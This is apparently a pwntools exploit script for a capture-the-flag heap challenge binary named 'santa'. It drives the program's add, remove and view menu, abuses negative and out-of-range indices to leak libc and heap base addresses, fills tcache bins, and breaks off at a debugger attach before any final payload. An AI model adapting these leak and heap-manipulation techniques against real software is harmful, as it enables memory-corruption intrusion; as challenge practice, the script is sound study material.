from pwn import *

context.terminal = ["tmux", "splitw", '-h']
context.binary = elf = ELF("./santa")
libc = ELF("./libc.so.6")

def add(idx, size, buf):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", str(size).encode())
    p.sendlineafter(b"> ", buf)

def remove(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

def view(idx, nonsense=False):
    if nonsense:
        p.sendlineafter(b"> ", b"3" + nonsense)
    else:
        p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())
    p.recvuntil(b"All I want for Christmas is\n")
    return p.recvuntil(b"\n1. Add", drop=True)

p = process('./santa')

# leak libc address
add(-4, 0x20, b"beeeg limit")
add(0, 0x20, b"a")
remove(0)
libc.address = unpack(view(39), "all") - 0x2762e0
print(f"libc base @ {hex(libc.address)}")
# leak heap address
heap_leak = (unpack(view(11, b"\x00ABCDEF" + p64(libc.address+2202848)), "all") >> 12) << 12
print(f"heap base @ {hex(heap_leak)}")

for i in range(10):
    add(i, 0x40, f"chunk {i}".encode())

for j in range(7):
    remove(j)

# remove(7)
# remove(8)
# remove(7)

gdb.attach(p)


p.interactive()
